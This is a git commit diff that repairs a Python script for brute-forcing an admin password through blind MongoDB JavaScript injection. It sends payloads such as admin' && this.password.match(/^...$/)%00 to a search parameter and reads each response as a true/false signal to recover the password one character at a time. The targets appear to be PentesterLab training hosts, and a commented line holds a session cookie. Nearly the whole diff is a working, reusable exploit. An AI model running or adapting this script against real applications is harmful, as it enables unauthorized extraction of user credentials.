7c1e3b5d9d6be9e30c2386cdab29fb94d222713e
kymb0 <55473161+kymb0@users.noreply.github.com>
2020-11-14 22:15:51 +0930

    Update mongodb_url_brutforce.py

--- Code_templates/mongodb_url_brutforce.py
+++ Code_templates/mongodb_url_brutforce.py
@@ -3,11 +3,11 @@ import requests, re, string
 
 s = requests.session()
 
-charset= dict.fromkeys((string.ascii_lowercase) + (string.digits))
-print(charset)
+charset= dict.fromkeys((string.ascii_lowercase) +(string.digits)+"-") #+ (string.ascii_uppercase)
+
 password=""
-target_host="ptc-326d0964-fdd096bb.libcurl.so"
-url="http://{0}/?search=admin'%20%26%26%20this.password.match(/{1}/)%00".format(target_host,password)
+target_host="ptc-8b6ede6f-5f141f80.libcurl.so"
+
 
 
 #cookie_obj=requests.cookies.create_cookie(domain="http://ptc-326d0964-fdd096bb.libcurl.so",name="rack.session",value="BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiRWI0ZWJkYTMwMzUzYmM2ZGY0YmNj%0AYzdhMzlhOTc4NGE4ZWIxMjhhZDlmNmRhZDIwZmJiOWUyNWQ0YzhmZDU1ODEG%0AOwBGSSIJY3NyZgY7AEZJIiU5YmU0MDVmNDk2YWUyMDAyNzAwN2ZiZGI4MzE1%0AZmRkNgY7AEZJIg10cmFja2luZwY7AEZ7B0kiFEhUVFBfVVNFUl9BR0VOVAY7%0AAFRJIi1hMWYzODY1Yjk4MGRiYjBiNDdkYTAwYzJlZGEwNzFkZWQ4ODE4NzBi%0ABjsARkkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsAVEkiLWRkMDY1ZWQyNjNj%0ANjdkNzk5Zjk0M2FiNmMzOWI1NWM1ZTAwOGNiYjUGOwBG%0A--358d15417fac70c6fdbde3955cd17c3134a694a8")
@@ -17,38 +17,36 @@ url="http://{0}/?search=admin'%20%26%26%20this.password.match(/{1}/)%00".format(
 
 #1614
 
-parsed_html = BeautifulSoup(resp.text, "html.parser")
+#parsed_html = BeautifulSoup(resp.text, "html.parser")
 
 
 
 
 def getstring(resp):
 	parsed_html = BeautifulSoup(resp.text, "html.parser")
-	find = str(parsed_html.find('p'))
+	parsed_html = str(parsed_html) #this was the key to easy boolean returns
+	find=parsed_html
+	#print(find)
 	return (find)
 
-def check()
-	resp = s.get(url)
+def check(test):
+	global resp
+	resp = s.get("http://{}/?search=admin'%20%26%26%20this.password.match(/{}/)%00".format(target_host,test))
 	find=getstring(resp)	
-	find = re.search("admin",str(find)) #>admin<
-	print(find)
-	return(find)
+	find = re.search(">admin<",str(find)) #>admin<
+	if find:
+		return(True)
+	else:	
+		return(False)
 
 
-while True
-    for c in charset
-    print "Trying: {c} for {password}"
-    test = password+c
-    if check("^{test}.*$")
-		password+=c
-		print(password)
-		break
+while True:
+	for c in charset:
+		print ("Trying: {0} for {1}".format(c,password))
+		test = ("^{0}.*$".format(password+c))
+		#print("http://{}/?search=admin'%20%26%26%20this.password.match(/{}/)%00".format(target_host,test))
+		if check(test):
+			password+=c
+			print(password)
+			break
 
-
-print(find)
-if find:
-	print("found")
-else:
-	print("not found :(")
-
-#response = s.post(target_url)
